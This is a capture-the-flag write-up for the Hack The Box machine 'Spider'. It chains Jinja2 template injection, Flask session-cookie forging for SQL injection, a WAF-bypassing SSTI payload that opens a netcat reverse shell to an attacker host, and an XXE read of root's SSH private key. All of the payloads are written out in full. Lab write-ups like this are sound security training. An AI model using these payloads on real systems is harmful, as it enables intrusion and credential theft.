# Spider

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.10.243 |
| **Status** | Retired |

## Overview
Spider is a hard-difficulty Linux machine focused entirely on web-based injection attacks against a Flask e-commerce application. A Server-Side Template Injection (SSTI) vulnerability in the registration username field leaks the Flask `SECRET_KEY`, which is then used to forge signed session cookies for an SQL injection attack that dumps the user database and yields administrative access. A second, WAF-protected SSTI vulnerability in an internal support-ticket portal is then exploited for remote code execution, and an XML External Entity (XXE) style file-read primitive is used to steal the root SSH private key directly.

## Reconnaissance
```
80/tcp open  http    nginx 1.14.0 (Ubuntu) - redirects to http://spider.htb/
```
Gobuster directory enumeration on `spider.htb` found:
```
/login     (200)
/register  (200)
/user      (302 -> /login)
/main      (302 -> /login)   <- admin panel (UUID + password login)
/checkout  (500)
/cart      (500)
```
The site is a chair shop with registration, cart/checkout, and an admin login (`/main`) that authenticates using a UUID issued at registration plus a password. A strict rate limit (1 request/second) applied to several endpoints.

## Enumeration
Registering a normal account (`rsff:lol123`) confirmed the checkout flow was broken (500 errors), redirecting focus to the registration username field. Testing classic SSTI payloads in the username at registration confirmed a Jinja2 SSTI vulnerability: registering with the username `{{config}}` reflected the full Flask app configuration object, including:
```
'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```
With the Flask `SECRET_KEY` known, session cookies could be forged and manipulated locally with `flask-unsign`. The admin login's UUID parameter was found to be vulnerable to SQL injection; a forged, signed cookie was crafted to inject a UNION-based SQLi payload into the `uuid` field:
```
flask-unsign --sign --cookie "{'uuid': \"' union select (SELECT database());#--\"}" --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```
`sqlmap`, driven through a custom `--eval` hook that re-signs the cookie with `flask-unsign` on every request, was used to fully automate extraction of the `users` table, dumping usernames and plaintext-ish passwords for several accounts (`chiv`, `rsff`, `test`, etc.).

## Foothold
Logging into the admin panel (`/main`) with the dumped `chiv` credentials revealed an internal support-ticket feature referencing another SSTI-vulnerable input, this one guarded by a Web Application Firewall (WAF) blocking common SSTI keywords. Bypassing the filter with hex-escaped attribute names (`\x5f\x5f` for `__`) allowed the same class of Jinja2 SSTI to reach `os.popen` for RCE:
```
{% print request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 443 >/tmp/f")|attr("read")() %}
```
This produced a shell as the `chiv` user.

## Privilege Escalation
A second internal service, reachable by forwarding a remote port (8080) to a local port (1337) via SSH, exposed another web form vulnerable to XML External Entity (XXE) injection through its username field:
```
username=&test;&version=--><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/.ssh/id_rsa'>]> <!--
```
The reflected response leaked the contents of `/root/.ssh/id_rsa`, which was used to SSH directly as `root`, completing the box.

## Lessons Learned
- Any user-controlled string rendered through a Jinja2 template (even something as innocuous as a "username") is a potential SSTI sink, and leaking `{{config}}` is often enough to recover the app's `SECRET_KEY`.
- Knowledge of a Flask `SECRET_KEY` compromises the integrity of every signed session cookie application-wide, enabling downstream attacks like forged-cookie SQL injection.
- WAFs that filter on literal keywords (`__class__`, `import`, etc.) are frequently bypassed using alternate encodings (hex-escaped attribute names), so SSTI/RCE filtering must be far more robust than simple string blocklists.
- XXE remains a reliable arbitrary file-read technique when XML input is parsed with external entity resolution enabled.

## Tools & References
- `flask-unsign` (session cookie signing/verification once `SECRET_KEY` is known), `sqlmap` with `--eval` hook for cookie re-signing
- PortSwigger Research: Server-Side Template Injection
- `id_rsa_chiv`, `id_rsa_root` (SSH private keys for the `chiv` user and for `root`, recovered during the engagement): omitted from the repository for hygiene; access paths for both are documented above.
- `Burp.burp` (8 MB Burp Suite project file used throughout the assessment for request interception/replay): omitted as an opaque proprietary project blob; the relevant request/response payloads are reproduced above.
